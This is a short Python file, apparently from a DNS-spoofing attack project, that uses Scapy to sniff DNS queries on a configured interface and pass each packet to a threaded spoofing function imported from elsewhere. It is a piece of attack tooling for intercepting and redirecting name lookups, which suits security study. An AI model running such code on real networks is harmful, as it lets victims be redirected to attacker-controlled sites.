from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
import sys
import os
import ipaddress
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'environment')))
from attack_status import ATTACK_STATUS
from websites import WEBSITES
from dns_spoofer import *

def launch_dns_spoofer(pkt):
    # Démarrage d'un thread pour dns_spoofer avec pkt
    thread = threading.Thread(target=dns_sorting_start, args=(pkt,))
    thread.start()

def dns_sniffer():
    iface = str(ATTACK_STATUS['iface'])
    print("Starting DNS sniffer")
    sniff(filter="udp port 53", prn= lambda pkt : launch_dns_spoofer(pkt), iface=iface) #udp port 53 for DNS requests #pkt is the received packet by sniff